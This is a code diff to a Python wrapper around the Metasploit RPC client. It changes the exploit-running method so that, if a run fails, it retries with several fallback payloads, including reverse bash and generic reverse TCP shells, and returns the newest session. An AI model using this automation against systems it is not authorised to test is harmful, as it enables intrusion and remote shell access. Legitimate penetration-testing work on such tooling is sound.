@@ -102,13 +102,14 @@ class MsfRpcClientWrapper:
             timeout: Max seconds to wait for session
         
         Returns:
-            (success, session_id, output) tuple
+            (success, session_id, output) tuple - ALWAYS returns this format
         """
-        if not self.is_connected():
-            if not self.reconnect():
-                return False, None, "RPC not connected. Start msfrpcd first."
-        
+        # FIX 3: Wrap entire method in try/except to ALWAYS return tuple
         try:
+            if not self.is_connected():
+                if not self.reconnect():
+                    return (False, None, "RPC not connected. Start msfrpcd first.")
+            
             with self._lock:
                 # Normalize module name (remove 'exploit/' prefix if present)
                 if module_name.startswith('exploit/'):
@@ -117,7 +118,11 @@ class MsfRpcClientWrapper:
                     module_path = module_name
                 
                 _log.info(f"Loading exploit: {module_path}")
-                exploit = self.client.modules.use('exploit', module_path)
+                
+                try:
+                    exploit = self.client.modules.use('exploit', module_path)
+                except Exception as e:
+                    return (False, None, f"Failed to load module {module_path}: {e}")
                 
                 # Set options
                 for key, value in options.items():
@@ -127,43 +132,60 @@ class MsfRpcClientWrapper:
                     except Exception as e:
                         _log.warning(f"  Could not set {key}: {e}")
                 
-                # Execute exploit with timeout
-                result = {}
-                error = {}
+                # FIX 3: Try multiple payloads if first fails
+                payloads_to_try = [
+                    payload,
+                    "cmd/unix/interact",
+                    "cmd/unix/reverse_bash",
+                    "generic/shell_reverse_tcp",
+                ]
                 
-                def execute_exploit():
+                for attempt_payload in payloads_to_try:
+                    result = {}
+                    error = {}
+                    
+                    def execute_exploit():
+                        try:
+                            result['job'] = exploit.execute(payload=attempt_payload)
+                        except Exception as e:
+                            error['msg'] = str(e)
+                    
+                    _log.info(f"Executing exploit with payload: {attempt_payload}")
+                    thread = threading.Thread(target=execute_exploit, daemon=True)
+                    thread.start()
+                    thread.join(timeout=timeout)
+                    
+                    if thread.is_alive():
+                        _log.warning(f"Exploit execution timed out after {timeout}s")
+                        continue  # Try next payload
+                    
+                    if 'msg' in error:
+                        _log.warning(f"Payload {attempt_payload} failed: {error['msg']}")
+                        continue  # Try next payload
+                    
+                    # Wait a moment for session to establish
+                    time.sleep(3)
+                    
+                    # Check for new sessions
                     try:
-                        result['job'] = exploit.execute(payload=payload)
+                        sessions = self.client.sessions.list
+                        if sessions:
+                            session_id = list(sessions.keys())[-1]  # Get newest session
+                            session_info = sessions[session_id]
+                            _log.info(f"✅ Session {session_id} opened: {session_info}")
+                            return (True, str(session_id), f"Session {session_id}: {session_info}")
                     except Exception as e:
-                        error['msg'] = str(e)
+                        _log.warning(f"Error checking sessions: {e}")
+                    
+                    # No session but no error either - continue with next payload
+                    _log.info(f"No session with payload {attempt_payload}, trying next...")
                 
-                thread = threading.Thread(target=execute_exploit, daemon=True)
-                thread.start()
-                thread.join(timeout=timeout)
-                
-                if thread.is_alive():
-                    _log.warning(f"Exploit execution timed out after {timeout}s")
-                    return False, None, f"Timeout after {timeout}s"
-                
-                if 'msg' in error:
-                    return False, None, error['msg']
-                
-                # Wait a moment for session to establish
-                time.sleep(3)
-                
-                # Check for new sessions
-                sessions = self.client.sessions.list
-                if sessions:
-                    session_id = list(sessions.keys())[-1]  # Get newest session
-                    session_info = sessions[session_id]
-                    _log.info(f"✅ Session {session_id} opened: {session_info}")
-                    return True, str(session_id), f"Session {session_id}: {session_info}"
-                
-                return False, None, "Exploit executed but no session created"
+                return (False, None, "Exploit executed but no session created (all payloads tried)")
                 
         except Exception as e:
+            # FIX 3: ALWAYS return tuple, never raise
             _log.error(f"Error running exploit: {e}")
-            return False, None, str(e)
+            return (False, None, f"Exception: {str(e)}")
     
     def list_sessions(self) -> dict:
         """List all active Metasploit sessions."""
